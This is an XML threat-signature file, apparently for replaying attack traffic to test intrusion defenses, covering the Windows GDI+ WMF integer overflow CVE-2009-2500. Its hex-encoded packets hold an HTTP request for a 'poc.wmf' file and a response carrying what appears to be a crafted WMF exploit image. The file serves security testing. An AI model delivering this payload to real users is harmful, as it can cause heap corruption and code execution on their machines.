<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Microsoft Windows GDIplus WMF Integer Overflow IPv6 version."/>
    <EngDesc display="true" value="An integer overflow vulnerability exists in Microsoft Windows GDI+ library. The vulnerability is due to an input validation error in Microsoft Windows while processing a crafted WMF image file. Remote attackers could exploit this vulnerability by persuading a target user to open a specially crafted WMF image file in the vulnerable products. Successful exploitation would cause a heap buffer overflow that may lead to arbitrary code execution in the security context of the logged in user, or terminate the application resulting in a Denial of Service condition."/>
    <Intent display="true">
      <item value="INTEGER_OVERFLOW"/>
    </Intent>
    <Protocol display="true" value="HTTP/HTTPS/IMAP/POP3/SMB/CIFS/SMTP.IPV6"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Severity display="true" value="High"/>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Excel_Viewer/Expression_Web/Forefront_Client_Security/Internet_Explorer/Office"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="2003/2/1.0/6.0/2003_2007_XP"/>
    </Known_Versions_Affected>
    <Credit display="true" value="TSL20091013-29"/>
    <CVEID display="true" value="CVE-2009-2500"/>
    <bugtraqID display="true" value=""/>
    <OSVDB display="true" value="MS09-062"/>
    <Author display="true" value=""/>
    <ID display="true" value="7ab58377b73a658e0de815d491bb6bbc"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value=""/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value=""/>
    <Suite display="true" value=""/>
    <RunOnce display="false" value=""/>
    <Valid_Traffic display="false" value=""/>
    <AccessVector display="false" value="NETWORK"/>
    <AccessComplexity display="false" value="MEDIUM"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="partial"/>
    <IntegImpact display="false" value="partial"/>
    <AvailImpact display="false" value="partial"/>
    <ImpactBias display="false" value=""/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="635526155252033850"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1417084228" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
  </Variables>
  <Loops>
    <for index="A"/>
    <for index="B"/>
  </Loops>
  <PostScript/>
  <Output index="A" Count="">
    <Ethernet srcMac="00:0C:29:25:A1:45" destMac="00:1B:78:75:79:68" pktType="0800">
      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="3FFE::0200:FF:FE00:1">
        <TCP srcPort="1039" destPort="80" SeqNumber="BDB83BF2" AckNumber="2E91E72F" HeaderLength="05" WindowSize="FAF0" Checksum="907D" UrgentPointer="0000" Options="" Payload="474554202F7E6D6B6861696E736F6E2F706F632E776D6620485454502F312E310D0A4163636570743A202A2F2A0D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E313B205356313B202E4E455420434C5220322E302E35303732373B202E4E455420434C5220332E302E343530362E323135323B202E4E455420434C5220332E352E3330373239290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IPv6>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="B" Count="">
      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:25:A1:45" pktType="0800">
        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="3FFE::0200:FF:FE00:1">
          <TCP srcPort="80" destPort="1039" SeqNumber="2E91E72F" AckNumber="BDB83CF2" HeaderLength="05" WindowSize="1920" Checksum="8DFE" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204672692C203233204F637420323030392032303A33333A313720474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A204672692C203233204F637420323030392032303A32373A303020474D540D0A455461673A2022353866383030662D3436302D34373661303038623838643030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20313132300D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20766964656F2F756E6B6E6F776E0D0A0D0A0100090000033002000008002C0200000000A000000026060F00CC00574D46430100000000000000280000000000000010008000000020000000010100000000000000000000000000000000000000000000000000000000000000041911114C42353589564646A4503F3FA43023238604020243000000010000000000000000000000000000000000000000000000000000000009050516746565B0CDC2C2FFDFD5D5FFE2D2D2FFD2B6B6FFC19C9CFF9E7A7AFB2F20219E0000000E0000000000000000000000000000000000000000000000007160608FF2EFEFFFEFF1F1FFE4E4E4FFDAD1D1FFC3ACACFFA68D8DFFCA9F9FFFBB908EFF0C08084A000000000000000900000000000000000000000000000000907E7E9EFEFEFEFFFAFDFEFFECF0F1FFD8D0D0FFC5A1A1FFAF7F7EFFC69998FFC69896FB1009094E4B322A79756163EC0F0A097A000000100000000000007E01000026060F00BBC3574D464301000000CEBCC2FFC58689FF00000000CC8DF0FFFFFF86F66C5B78FADDDAE9FFF7EDE7FFBCACB1FF554A4AD80B08084B00000000000000004731373EDC9056FDF1A548FFD79386FFC96B78FFC44C51FFE7A199FFCFB7C1FF118BFBFF89B5E6FFB87765FFAE8E92FFC1C0B2FF49413EAE00000000000000004A373D66F2A54AFFFFB40DFFFCA90BFFC38336FF964630FFA16D7BFF198EF8FF7BC8FAFFF7CBB3FFB78C88FFA17978FFB58A89FF4D3938A90000000000000000755B5A96FEBD57FFF8AD18FFBFA6B5FFF9FBF7FFF4EDB6FFA79683FF778B81FFF2AAA1FFE3C1C4FFB9888BFFC29090FFC38F8EFF4E3838A80000000003030403A1817ACEFFCD51FFBF902FFFFFFFFFFFFFFFFFFFFFFFE8FFFCEAB5FFBD5C0EFFDFA5A6FFDABDC1FFB98785FFBA8787FFC58D8DFF503737A8000000001614181DC8A693F3FFD15DFFC8A163FFFFFFFFFFFFFFFFFFFFFFFFFFFEF9D5FFA56D45FFD7B0B5FFDCBBBAFFB88586FFBB8A8AFFC28A8AFF513535A8000000003832374EDCBE9BFFFFD874FFE5C076FFFEEED8FFFFFF17FFFFFFFFFFFBF8F6FFB57547FFD8B3BCFFD8B3B2FFBD7878FFBA7D7DFFC18686FF523434A800000000615C6281E6C99CFFFFE787FFFFEBA0FFE3C49FFFE4AB92FFBC92BFFFE5CB83FFD49C6DFFD8BBC4FFE3CACCFFD99A9AFFCB7575FFCF7474FF573333AE000000009B979AC1CDBCAAFFD6C096FFE5D2A3FFF5EEBDFFF8F6C5FFFCF5B3FFFFF399FFDEAF95FFF4DDE1FFFBE9E9FFF5E1E1FFE3C4C4FDCA8D8DEC482B2B80000000007877776F979496B2A4999EDBB5A3A4F5BFA7A6FFCEB2A9FFD8BFA8FFE5C49AFFBE9287FE997C7EB97761618E514141642E25253B111111150302020229982E000000000000000000332F2F094D4646236356574B766466738E74789CB48E91D56046479A0000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000029980000000F00000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IPv6>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
